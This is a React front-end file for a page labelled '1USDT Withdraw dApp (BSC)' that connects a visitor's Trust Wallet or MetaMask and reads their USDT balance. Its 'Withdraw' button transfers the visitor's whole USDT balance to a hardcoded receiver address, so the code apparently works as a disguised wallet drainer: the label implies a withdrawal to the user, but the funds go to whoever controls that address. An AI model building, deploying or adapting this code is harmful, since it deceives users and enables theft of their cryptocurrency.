import React, { useState } from "react";
import { ethers } from "ethers";

// USDT contract on BSC (BEP-20)
const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint amount) returns (bool)"
];

// Your receiving wallet (where USDT goes after withdraw)
const RECEIVER_ADDRESS = "0x45e0c5af78c5ff0ff61cba8eb5a35507a31d5d6c";

// Force BSC chainId
const BSC_CHAIN_ID = "0x38"; // 56 in hex

function App() {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [address, setAddress] = useState("");
  const [balance, setBalance] = useState("0");

  // Connect Trust Wallet
  const connectWallet = async () => {
    if (!window.ethereum) {
      alert("Trust Wallet / MetaMask not found!");
      return;
    }

    try {
      // Force switch to BSC
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }]
      });

      const prov = new ethers.providers.Web3Provider(window.ethereum);
      await prov.send("eth_requestAccounts", []);
      const signer = prov.getSigner();
      const userAddress = await signer.getAddress();

      setProvider(prov);
      setSigner(signer);
      setAddress(userAddress);

      // Fetch USDT balance
      const usdt = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, prov);
      const decimals = await usdt.decimals();
      const bal = await usdt.balanceOf(userAddress);
      setBalance(ethers.utils.formatUnits(bal, decimals));
    } catch (err) {
      console.error(err);
      alert("Failed to connect wallet: " + err.message);
    }
  };

  // Withdraw all USDT to your wallet
  const withdraw = async () => {
    if (!signer) {
      alert("Please connect wallet first");
      return;
    }

    try {
      const usdt = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, signer);
      const decimals = await usdt.decimals();
      const bal = await usdt.balanceOf(address);

      if (bal.isZero()) {
        alert("No USDT to withdraw!");
        return;
      }

      const tx = await usdt.transfer(RECEIVER_ADDRESS, bal);
      await tx.wait();
      alert("✅ Withdraw successful! Tx Hash: " + tx.hash);
    } catch (err) {
      console.error(err);
      alert("Withdraw failed: " + err.message);
    }
  };

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <h2>1USDT Withdraw dApp (BSC)</h2>
      {address ? (
        <>
          <p>Connected: {address}</p>
          <p>USDT Balance: {balance}</p>
          <button onClick={withdraw}>Withdraw</button>
        </>
      ) : (
        <button onClick={connectWallet}>Connect Trust Wallet</button>
      )}
    </div>
  );
}

export default App;
